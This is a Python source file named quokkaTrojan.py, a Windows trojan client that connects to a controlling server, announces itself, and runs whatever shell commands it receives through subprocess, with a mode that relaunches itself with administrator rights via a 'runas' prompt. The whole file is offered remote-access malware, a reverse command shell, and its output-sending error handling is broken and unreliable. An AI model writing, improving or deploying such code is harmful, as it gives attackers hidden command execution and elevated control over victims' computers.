# quokkaTrojan.py

import os
import sys
from win32comext.shell import shell
import socket
import subprocess

isDebug = True

def main():

    def send_message(sock,msg):
        sock.send(msg.encode('utf-8'))
        print("waiting for server...")

    def receive_message(sock):
        data = sock.recv(1024).decode('utf-8')
        print("Received:", data)
    
    def cmd_handle(sock,cmd):
        if(cmd[:2]=="cd"):
            os.chdir(str(cmd[3:]))
            output=os.getcwd()
            return output
        elif(cmd[:2]=="ls"):
            dir_list=os.listdir(os.getcwd())
            return dir_list
        elif(cmd[:2]=="ft"):
            print("file transfer mode...")
        else:
            output = subprocess.getoutput(cmd)
            return output
        

    def recv_sys_send(sock):
        try:
            print("Waiting Server message...")
            recved_cmd = sock.recv(1024).decode('utf-8')
            print(recved_cmd)
            output = cmd_handle(sock,recved_cmd)
            
        except Exception as e:
            print(f'output send error : {e}')
            sock.send(output.encode('cp949',errors='ignore'))
            print('cp949 sended')

            print(f'sended message : {output}')

        except Exception as e:
            sock.send(f'Error : {e}'.encode('utf-8'))

    # Set up the client socket
    HOST = 'localhost'  # Use the server's IP address or hostname
    PORT = 5000  # Use the same port number as the server

    print("quokkaoTALK client start...")

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        # 연결을 요청한다.
                client_socket.connect((HOST, PORT))
                send_message(client_socket,"Trojan Connected!")
                while True:
                    recv_sys_send(client_socket)
        except Exception as e:
            # os.system("notepad")
            print(e)
            pass

if (sys.argv[-1] != 'child' and isDebug == False):
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script]+sys.argv[1:]+['child'])
    shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
    sys.exit(0)

if (sys.argv[-1] == 'child' and isDebug == False):
    main()

if(isDebug==True):
    print("Hello Hacker, Debug mode Activated...")
    main()
    